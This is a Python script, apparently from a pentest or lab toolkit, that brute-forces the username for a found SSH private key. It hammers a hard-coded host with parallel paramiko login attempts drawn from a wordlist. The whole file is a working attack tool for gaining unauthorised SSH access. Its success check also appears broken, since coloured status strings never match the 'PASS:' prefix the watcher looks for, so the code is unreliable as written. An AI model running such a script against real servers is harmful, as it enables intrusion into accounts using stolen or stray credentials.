"""Lost & Found key owner SSH brute-force

Brute-force a username for a found SSH private key.

USAGE

$ python ssh-key-user-enum.py username.wordlist.txt

NOTE

Edit hostname and key_filename!
"""

import logging
import sys
import time
from multiprocessing import Process, Queue
from pathlib import Path

import paramiko

VERBOSE = True  # stdout of attempts
# VERBOSE = 2  # Prints traceback on exception
hostname = "192.168.73.49"  # CHANGEME
key_filename = "./id_rsa"  # CHANGEME

# hostname = "localhost"
# key_filename = "/home/kali/.ssh/kali_key"


class Colors:
    """ANSI color codes"""

    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"


def setup_logger():
    logger = logging.getLogger("paramiko")
    logger.setLevel(logging.CRITICAL)


def get_client():
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    return client


def wordlist_loader(path: Path):
    for line in path.open(mode="r", encoding="utf-8"):
        yield line


def username_loader(queue: Queue, username_path: Path):
    print("~> 🚚 LOADER STARTED 🚚")
    if username_path.is_file():
        print("Found wordlist")
        for username in wordlist_loader(username_path):
            username = username.strip()
            if username:
                queue.put(username)
    else:
        print(f"Using given: {username_path}")
        queue.put(str(username_path))


def worker(client, username_queue, status_queue):
    print("~> ⚒ WORKER STARTED ⚒ ")
    while True:  # Add a check, if the loader is on
        username = username_queue.get()
        try:
            client.connect(hostname, username=username, key_filename=key_filename)
            # _, out, _ = client.exec_command("whoami")
            # res = str(out.read())
            # print(res)
            client.close()
            status_queue.put(f"{Colors.GREEN}PASS: {username}{Colors.END}")
            break
        except ValueError:
            if VERBOSE:
                status_queue.put(f"{Colors.RED}FAIL: {username}{Colors.END}")
        except:
            if VERBOSE == 2:
                import traceback

                traceback.print_exc()

            if VERBOSE:
                status_queue.put(f"{Colors.RED}FAIL: {username}{Colors.END}")
            sys.exit()
    print("Worker shut down, wordlist empty")
    sys.exit()


def terminate_processes(processes: list[Process]):
    for p in processes:
        try:
            p.terminate()
        except AttributeError:
            pass


def watcher(status_queue: Queue, valid_queue: Queue, process_list: list[Process]):
    print("~> 🔭 WATCHER STARTED 🔭")
    counter = 0
    while True:
        try:
            status = status_queue.get()
        except KeyboardInterrupt:
            terminate_processes(process_list)
            sys.exit()
        counter += 1
        print(f"{counter}. {status}")
        if status.startswith("PASS:"):
            valid_queue.put(status)
            terminate_processes(process_list)
            break


def run():
    setup_logger()
    client = get_client()
    username_path = Path(sys.argv[1])
    if not username_path.exists():
        sys.exit("Username wordlist doesn't exist")
    username_queue = Queue()
    status_queue = Queue()
    valid_queue = Queue()
    processes = []
    worker_count = 5

    for _ in range(worker_count):
        p = Process(target=worker, args=(client, username_queue, status_queue))
        processes.append(p)

    loader_p = Process(target=username_loader, args=(username_queue, username_path))
    loader_p.start()
    time.sleep(1)
    watcher_p = Process(target=watcher, args=(status_queue, valid_queue, processes))
    processes.extend([loader_p, watcher_p])
    for p in processes:
        if not p.is_alive():
            try:
                p.start()
            except AssertionError:
                pass

    username = valid_queue.get()
    username = username.replace("PASS: ", "")
    print(f"Valid username is '{username}'")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Only 1 argument is required!")
        sys.exit(1)

    start_time = time.time()
    try:
        run()
    except KeyboardInterrupt:
        pass
    print(f"Time taken: {time.time() - start_time}s")
